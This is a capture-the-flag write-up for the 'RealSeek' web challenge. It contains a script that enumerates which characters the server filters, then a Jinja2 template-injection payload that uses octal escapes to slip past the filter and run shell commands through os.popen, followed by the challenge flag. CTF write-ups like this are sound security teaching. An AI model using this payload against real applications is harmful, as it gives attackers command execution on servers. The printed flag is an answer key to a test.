# RealSeek

## Description

Author: <strong>puck</strong>

After I got hacked, I learned to code securely. I added so many filters that no hacker can get through me now

[Challenge](https://seek.ctf.cert.unlp.edu.ar)
[Mirror](https://seek-mirror.mirror-ctf.cert.unlp.edu.ar/)

## Solution

![realseek-1](/assets/ctf/metared/realseek-1.png)

Upgraded version of previous challenge `Babyseek`

Identify blocked chars: 

```py
import requests, string, base64

URL = 'https://seek.ctf.cert.unlp.edu.ar/'
for c in string.printable:
    resp = requests.post(URL, json={"encoded": base64.b64encode(c.encode()).decode()})
    print(resp.text)
    if 'ILLEGAL CHARACTER' in resp.text:
        print(f"{c} blocked")
```
::: info :information_source:
Blocked Chars: ```0, 2, 4, 5, 6, 8, 9, f, j, k, v, w, x, y, z, A, B, C, D, E, G, H, J, K, L, M, N, O, P, Q, R, T, U, V, W, X, Y, Z, !, #, %, &, ', +, ,, -, ., /, :, ;, <, =, >, ?, @, ^, _, `, |, ~```
:::

Since they are many characters blocked we have to get smart about our payload. From my observation I could use `request` within the boundaries and after that I built the payload.

Reference: [Jinja2 SSTI - without several chars](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#without-several-chars)


Verbose Payload: 
::: raw
```
{{
    request["application"]
    ["__globals__"]   
    ["__builtins__"]  
    ["__import__"]  
    ("os")["popen"] 
    (request["args"]["c"])["read"]()
}}
```

Encoded Payload: 

```
{{request["application"]["\137\137globals\137\137"]["\137\137builtins\137\137"]["\137\137import\137\137"]("os")["popen"](request["args"]["c"])["read"]()}}
```
:::
::: info :information_source:
`\137` is `_`, but in Octal code.
:::
::: warning :warning:
For the payload to work `request["args"]["c"]` is required, meaning we should include `GET param "c"` as command, like `ls` or `cat flag`. Since spaces are restricted I couldnt find other workaround.
:::

Enumerate:

![realseek-2](/assets/ctf/metared/realseek-2.png)

Profit:

![realseek-3](/assets/ctf/metared/realseek-3.png)
::: tip Flag
`FLAG{U_4R_TH#_R34L_BYP4SS3R!}`
:::